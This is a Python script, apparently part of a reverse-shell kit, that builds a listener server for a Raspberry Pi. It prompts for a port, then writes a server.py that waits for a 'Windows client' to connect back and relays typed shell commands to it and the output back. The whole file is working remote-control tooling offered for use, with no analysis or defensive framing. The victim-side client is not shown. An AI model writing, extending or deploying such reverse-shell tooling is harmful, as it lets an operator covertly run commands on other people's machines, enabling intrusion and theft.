import os
import sys


def main():
    print("=" * 52)
    print("  Pi Reverse Shell - Server Builder")
    print("=" * 52)
    print()

    port_input = input("Enter the port to listen on [default: 6000]: ").strip()
    port = 6000
    if port_input:
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            print("[!] Invalid port. Using 6000.")
            port = 6000

    server_code = f'''import socket
import threading
import sys
import os
import select

HOST = "0.0.0.0"
PORT = {port}

_disconnected = threading.Event()


def receive_output(conn):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            sys.stdout.write(data.decode(errors="ignore"))
            sys.stdout.flush()
    except Exception:
        pass
    finally:
        _disconnected.set()


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)

    while True:
        print(f"[+] Waiting for Windows client on {{HOST}}:{{PORT}} ...")
        _disconnected.clear()

        try:
            conn, addr = server.accept()
        except KeyboardInterrupt:
            print("\\n[!] Server stopped.")
            break

        print(f"[+] Windows client connected: {{addr}}")
        threading.Thread(target=receive_output, args=(conn,), daemon=True).start()

        try:
            while not _disconnected.is_set():
                readable, _, _ = select.select([sys.stdin], [], [], 0.5)
                if _disconnected.is_set():
                    break
                if readable:
                    cmd = sys.stdin.readline()
                    if not cmd:
                        break
                    if cmd.lower().strip() == "cls":
                        os.system("clear")
                        continue
                    try:
                        conn.sendall(cmd.encode())
                    except Exception:
                        break
        except KeyboardInterrupt:
            print("\\n[!] Disconnecting client.")

        conn.close()

        if _disconnected.is_set():
            print(f"\\n[!] Windows client {{addr}} disconnected. Waiting for reconnect...")


if __name__ == "__main__":
    main()
'''

    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")
    os.makedirs(output_dir, exist_ok=True)
    output_path = os.path.join(output_dir, "server.py")

    with open(output_path, "w") as f:
        f.write(server_code)

    print()
    print(f"[+] server.py created at: {output_path}")
    print()
    print("  Next steps:")
    print(f"    1. Transfer output/server.py to your Raspberry Pi.")
    print(f"    2. Run on the Pi:  python server.py")
    print(f"    3. The server will listen on port {port} for the Windows client.")
    print()


if __name__ == "__main__":
    main()
